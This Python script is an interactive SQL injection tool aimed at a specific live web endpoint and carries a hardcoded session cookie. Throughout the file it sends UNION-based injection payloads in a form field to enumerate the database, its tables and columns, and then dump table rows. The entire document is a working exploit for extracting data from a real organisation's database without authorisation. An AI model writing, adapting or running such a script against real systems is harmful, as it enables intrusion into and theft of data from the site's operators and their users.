import requests
import re

URL = "http://file.worlddivision.or.kr:8080/am/manage/logDetail.dat.php"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
    "Cookie": "C_VX_User=4bba9amcnamdrvcg3tgbhS"
}

def send_payload(payload):
    data = {
        "reginfo": payload
    }
    try:
        resp = requests.post(URL, headers=HEADERS, data=data)
        if resp.status_code == 200:
            return resp.text
    except Exception as e:
        print(f"[!] Request error: {e}")
    return None

def extract_result(text):
    matches = re.findall(r'~(.*?)~', text)
    return matches[0] if matches else None

def get_database():
    payload = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,database(),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def get_tables(db):
    payload = f"1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{db}'),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def get_columns(db, table):
    payload = f"1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}'),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def dump_table(db, table, columns, limit=10):
    cols = ',0x3a,'.join(columns.split(','))
    payload = f"1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(CONCAT_WS(':',{cols})) FROM {table} LIMIT {limit}),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def interactive():
    print("== SQLi Interactive Shell ==")
    current_db = None

    while True:
        cmd = input("> ").strip()
        if cmd in ('exit', 'quit'):
            break
        elif cmd == 'dbs':
            current_db = get_database()
            print(f"[DB] {current_db}")
        elif cmd == 'tables':
            if not current_db:
                print("[!] Run 'dbs' first")
                continue
            tables = get_tables(current_db)
            print(f"[Tables] {tables}")
        elif cmd.startswith('columns '):
            if not current_db:
                print("[!] Run 'dbs' first")
                continue
            _, table = cmd.split(maxsplit=1)
            cols = get_columns(current_db, table)
            print(f"[Columns] {cols}")
        elif cmd.startswith('dump '):
            if not current_db:
                print("[!] Run 'dbs' first")
                continue
            _, table = cmd.split(maxsplit=1)
            cols = get_columns(current_db, table)
            print(f"[Columns] {cols}")
            data = dump_table(current_db, table, cols)
            print(f"[Data] {data}")
        else:
            print("[?] Unknown command")

if __name__ == "__main__":
    interactive()
